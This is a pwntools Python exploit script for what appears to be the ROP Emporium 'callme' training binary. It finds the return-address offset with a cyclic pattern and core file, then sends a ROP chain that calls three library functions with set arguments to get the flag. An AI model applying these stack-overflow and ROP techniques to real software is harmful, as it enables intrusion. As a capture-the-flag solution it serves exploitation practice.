#!/usr/bin/env python3

from pwn import *

exe = ELF("callme_patched")
libc = ELF("libcallme.so")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)        
    # parameters = 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d

    payload = cyclic(100)
    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    stack = core.rsp
    rip_value = core.read(stack, 4)
    rip_offset = cyclic_find(rip_value)

    r = conn()
    pop3 = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]
    payload = flat(b'a'*rip_offset, pop3, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d, exe.symbols.callme_one, pop3, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d, exe.symbols.callme_two, pop3, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d, exe.symbols.callme_three)
    r.sendlineafter(b'>', payload)
    
    r.recvline()
    r.recvline()
    r.recvline()
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
